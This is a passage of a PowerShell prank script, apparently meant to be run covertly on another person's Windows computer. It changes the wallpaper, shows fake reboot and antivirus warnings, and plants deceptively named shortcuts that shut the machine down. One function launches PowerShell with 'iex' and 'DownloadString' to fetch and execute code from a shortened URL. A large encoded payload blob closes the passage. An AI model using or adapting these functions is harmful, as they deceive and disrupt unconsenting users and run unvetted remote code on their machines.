J1PQXvXrRfh/fMV5S/6l3FZNkIndK8SY4T+xVDJjjXY19NqZ+zi2L7Y4QZu7zrJN8wCU62gaz530qDxHat1zvkgBKgpO94j5EVStrsoQlGUATl+NFwTaS6THuioYYo+jVlqJezeIx2IdzFxSuN5+ccKc7FwLWOUvCPFeVKQ5mF1ZU3OU8zxrF4ZsruP/AJE8xwPKhK+4eJZJbsNCZ0VVhPwihKT8iXEs4bEOJbZbTyzb5SOG7zpqULfUFhYBTO+lEqE8k8BQcCkLbBXvEt8dfEa39latujxemhozPjHcSuyuy+JxDyW2U944pUQrkbklPACAfWu39ntn7G2Hh+8xS2V44gl11RCzBuO7B05elVxeJcw+yWe4PdEsC6QAdOcTUHsvCMvgreQHVFWqpUdBxNZmRuR0mLFGCsl9te19KXR9jwylA5t9ZO+RoYTpT/YPaHb200odbYCGHHQO8MpSlMDfAPiuSPSubdscM0jDrShASN2wsNTXonZB/wDRYL/9sx/wps0IqI+nySnOSsl2Ge6bHeLDiwFZ3Iyz1A4UzxpkhydywB/X109Kg+02OfZQz3a8ubEtJNhMQLXFW92+BBMTnT041m0dU2QIYSpK0k5VHwC+aRfhSi+AjVPnBKgdLzzimzp+8VTZajz939RUYkSTWFzgkoCFnXJYxyV0rbWyEKhoiECcwF6fbNUZN/e/WjoUcyr8TToMp20MIlpYUFpCRNtBPLziKgUKLjhIkRoTp6VY9p3UqetVDELKXlQY3fnFXEVpE+hKd2YKzy8jqOVR776TFr2kaJmOFRRcUXJJ5fSmrzipVf8AcihSI7LX9oGUA5BaQR7p5fKo91Y1PitI6TTDvFd0L+8PqaZPOrzEyZ/vQURfIWTEvyBxSFJ01nlTBxQUq4tf62mhMKPcrv7tMHnFRqdB9TSoZZfocuYmZRorjGvnTFb8psZI1/vQC4o6nn9KYpUedWVED5B2ziPvDOhmL3nypCVDNoQfKFeflTUHe9akFfxE1O0QWP8ACNKW7pOkcCY1NdR7AYVJxYxCkwhgqUOKSrKoD1kmuaoUQkEWMK+hr0H2fYbTsjDlKQM7LaldVG0n4CgiuoWpe2Jd/wDVPyJrKisgrK2thydH/9k='
$decodedFile=[System.Convert]::FromBase64String($b64)
Set-Content -Path "$($env:USERPROFILE)\hasselhoff.jpg" -Value $decodedFile -Encoding Byte

# Add Interop Type Definition
Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Joker { [DllImport("user32.dll",CharSet=CharSet.Unicode)] public static extern int SystemParametersInfo (Int32 uAction,Int32 uParam,String lpvParam,Int32 fuWinIni); }' | Out-Null

# Apply changes
[Joker]::SystemParametersInfo(0x0014, 0, ($($env:USERPROFILE)+"\hasselhoff.jpg"), (0x01 -bor 0x02))

# Remove image file
Remove-Item "$($env:USERPROFILE)\hasselhoff.jpg"

#Uncomment Exit if this is a drive by hit
#Exit
}

function Invoke-FakeScreenWarning
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
 $xaml = @"
<Window
 xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation'>
 
 <Border BorderThickness="20" BorderBrush="Yellow" CornerRadius="9" Background='Red'>
  <StackPanel>
   <Label FontSize="50" FontFamily='Stencil' Background='Red' Foreground='White' BorderThickness='0'>
    System will be rebooted in 15 seconds!
   </Label>
 
   <Label HorizontalAlignment="Center" FontSize="15" FontFamily='Consolas' Background='Red' Foreground='White' BorderThickness='0'>
    Worried about losing data? Talk to your friendly help desk representative and freely share your concerns!
   </Label>
  </StackPanel>
 </Border>
</Window>
"@
$reader = [System.XML.XMLReader]::Create([System.IO.StringReader] $xaml)
$window = [System.Windows.Markup.XAMLReader]::Load($reader)
$Window.AllowsTransparency = $True
$window.SizeToContent = 'WidthAndHeight'
$window.ResizeMode = 'NoResize'
$Window.Opacity = .7
$window.Topmost = $true
$window.WindowStartupLocation = 'CenterScreen'
$window.WindowStyle = 'None'
# show message for 5 seconds:
$null = $window.Show()
Start-Sleep -Seconds 5
$window.Close()
}

function Invoke-FakeReboot
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic") | Out-Null
    $popuptype=[microsoft.visualbasic.msgboxstyle]::Exclamation -bor [microsoft.visualbasic.msgboxstyle]::OKOnly -bor [microsoft.visualbasic.msgboxstyle]::DefaultButton1
    $a=60
    while (1)
    {
        $a=$a-1
        $ans = [Microsoft.VisualBasic.Interaction]::MsgBox("CRITICAL ERROR REBOOTING IN ... $a"+"s",$popuptype,"Windows")
        $ans
    }
}

function Invoke-FakeReboot2
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    $timer = New-Object System.Timers.Timer
    $timer.AutoReset = $true #resets itself
    $timer.Interval = 1000 #ms
    $initial_time = Get-Date
    $end_time = $initial_time.AddSeconds(12) ## don't know why, but it needs 2 more seconds to show right

    # create windows script host
    $wshell = New-Object -ComObject Wscript.Shell
    # add end_time variable so it's accessible from within the job
    $wshell | Add-Member -MemberType NoteProperty -Name endTime -Value $end_time

    Register-ObjectEvent -SourceIdentifier "PopUp Timer" -InputObject $timer -EventName Elapsed -Action {
        $endTime = [DateTime]$event.MessageData.endTime
        $time_left = $endTime.Subtract((Get-Date)).Seconds

        if($time_left -le 0){
            $timer.Stop()
            Stop-Job -Name * -ErrorAction SilentlyContinue
            Remove-Job -Name * -ErrorAction SilentlyContinue
            #other code
            # logoff user?
        }
        $event.MessageData.Popup("Your PC will be shutdown in $time_left sec",1,"Message Box Title",64)
    } -MessageData $wshell

    $timer.Start()
}

function Set-XXXShortcut
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    $WshShell = New-Object -comObject WScript.Shell
    $DesktopPath = [Environment]::GetFolderPath("Desktop")
    $Shortcut = $WshShell.CreateShortcut("$DesktopPath\Porno.lnk")
    $Shortcut.TargetPath = '"C:\\Windows\\System32\\cmd.exe"'
    $Shortcut.Arguments = '/k shutdown /S /T 10 /C "La carpeta del porno excede el tama o aconsejado."'
    $Shortcut.WorkingDirectory = '"C:\\"'
    $Shortcut.IconLocation = "C:\WINDOWS\system32\imageres.dll, 3"
    $Shortcut.Save()

    #user
    $outfolder=[Environment]::GetFolderPath("UserProfile")
    copy-item $DesktopPath\Porno.lnk $outfolder\porno.lnk
    #documents
    $outfolder=[Environment]::GetFolderPath("MyDocuments")
    copy-item $DesktopPath\Porno.lnk $outfolder\porno.lnk
    #videos
    $outfolder=[Environment]::GetFolderPath("MyVideos")
    copy-item $DesktopPath\Porno.lnk $outfolder\porno.lnk
    #images
    $outfolder=[Environment]::GetFolderPath("MyPictures")
    copy-item $DesktopPath\Porno.lnk $outfolder\porno.lnk
}

function Set-FakeVirusScan
{
#.DESCRIPTION Displays a cmd window to fool a user into waiting for antivirus definitions to update. Finishes update at 69 and 420 %.
#.AUTHOR https://raw.githubusercontent.com/kaburkett
cmd.exe
echo off
echo ****************************************************************
echo ****************************************************************
echo *********     SEMANTIC ANTIVIRUS: UPDATING DEFINITIONS      ****
echo ****************************************************************
echo ****************************************************************
TIMEOUT /T 5 /NOBREAK > null
echo Updating . . 10 percent complete.
TIMEOUT /T 5 /NOBREAK > null
echo Updating . . 20 percent complete.
TIMEOUT /T 5 /NOBREAK > null
echo Updating . . 30 percent complete.
TIMEOUT /T 5 /NOBREAK > null
echo Updating . . 40 percent complete.
TIMEOUT /T 5 /NOBREAK > null
echo Updating . . 50 percent complete.
TIMEOUT /T 5 /NOBREAK > null
echo Updating . . 60 percent complete.
TIMEOUT /T 5 /NOBREAK > null
echo Updating . . 69 percent complete.
TIMEOUT /T 5 /NOBREAK > null
echo Updating . . 420 percent complete. Applying new definitions. . . 
TIMEOUT /T 5 > null
}


### Stupid
Function Invoke-CatFact 
{
    Add-Type -AssemblyName System.Speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $catFacts = "https://pastebin.com/raw/FwNwnj7H"
    $random = Get-Random -minimum 20 -maximum 60
    Start-Sleep -s $random
    $voice = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $web = (Invoke-WebRequest -uri $catFacts).tostring() -split "[`n]"
    $random = Get-Random $web
    #$speak.Volume = 10
    $voice.Speak("Did you know?")
    $voice.Speak($random)
}

Function Invoke-RickRoll
{
    Set-AudioLevel(0.4) #For optimal surprise
    Start-Process iexplore -ArgumentList "-k https://www.youtube.com/watch?v=dQw4w9WgXcQ"
}

function Invoke-RickRollAscii
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
# PowerShell + HTML5 prototype. Needs audio. Run: iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
if($host.Name -ne "ConsoleHost")
{
    Start-Process powershell -ArgumentList '-noprofile -noexit -command iex (New-Object Net.WebClient).DownloadString(''http://bit.ly/e0Mw9w'')'
    return
}

$data = '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